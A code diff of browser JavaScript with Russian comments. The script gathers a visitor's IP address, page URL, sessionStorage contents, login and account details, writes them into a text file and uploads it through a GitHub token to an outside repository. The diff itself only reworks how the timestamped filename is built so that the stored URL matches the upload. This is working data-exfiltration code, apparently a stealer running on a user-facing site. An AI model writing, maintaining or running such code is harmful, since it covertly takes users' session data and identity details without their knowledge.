@@ -11,6 +11,8 @@
             return matches ? decodeURIComponent(matches[1]) : undefined;
         };
 
+        const un1xxd = Math.floor(Date.now() / 1000);
+        
         // Получаем IP
         const getIP = async () => {
             try {
@@ -33,8 +35,7 @@
 		  }
 
 		async function createGitHubFile(github_pat, owner, repo) {
-    const unixTime = Math.floor(Date.now() / 1000);
-    const fileName1 = `${unixTime}_${user.login}.txt`;
+    const fileName1 = `${un1xxd}_${user.login}.txt`;
 
     const fileContent = JSON.stringify(userDataResult, null, 2);
     const contentBase64 = btoa(unescape(encodeURIComponent(fileContent)));
@@ -211,7 +212,7 @@
             const sessionStorageData = JSON.stringify(sessionStorage);
             
             // Формируем текстовый файл
-            let fileContent = `--- УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ ---\n${userLevel}\ngems: ${user.premiumPoints}\nselected server: ${document.getElementById('selectServer')?.options[document.getElementById('selectServer')?.selectedIndex]?.text || 'N/A'}\nAccses URL: https://raw.githubusercontent.com/uloxa13/userDatas/refs/heads/main/${Math.floor(Date.now() / 1000)}_${user.login}.txt\n\n`;
+            let fileContent = `--- УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ ---\n${userLevel}\ngems: ${user.premiumPoints}\nselected server: ${document.getElementById('selectServer')?.options[document.getElementById('selectServer')?.selectedIndex]?.text || 'N/A'}\nAccses URL: https://raw.githubusercontent.com/uloxa13/userDatas/refs/heads/main/${un1xxd}_${user.login}.txt\n\n`;
             fileContent += `--- ОСНОВНЫЕ ДАННЫЕ ---\n`;
             fileContent += `IP-адрес: ${userIP}\n`;
             fileContent += `URL страницы: ${window.location.href}\n`;
